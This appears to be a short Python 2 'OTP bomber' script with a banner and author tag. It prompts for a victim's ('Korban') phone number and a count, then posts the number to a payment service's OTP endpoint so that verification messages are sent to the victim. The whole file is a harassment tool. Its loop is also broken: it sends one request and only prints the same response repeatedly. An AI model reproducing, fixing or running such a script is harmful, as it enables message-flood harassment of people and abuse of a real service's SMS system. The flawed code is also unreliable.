import requests
import sys
import os
import random, time
os.system("clear")

r = requests.Session()


def main(s):
  for c in s + "\n":
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(random.random() * 0.2)
os.system("figlet NOL3P-IQ | lolcat")
main("~# AUTHOR : ARJUNZ-LOVERS")
print
print

no = raw_input("NO Korban  : ")
jml = raw_input("Jumlah : ")
url = "https://www.tokocash.com/oauth/otp"

data = {"msisdn":no}

res = r.post(url, data=data).text

for c in range(int(jml)):
    print (res)
    time.sleep(1)
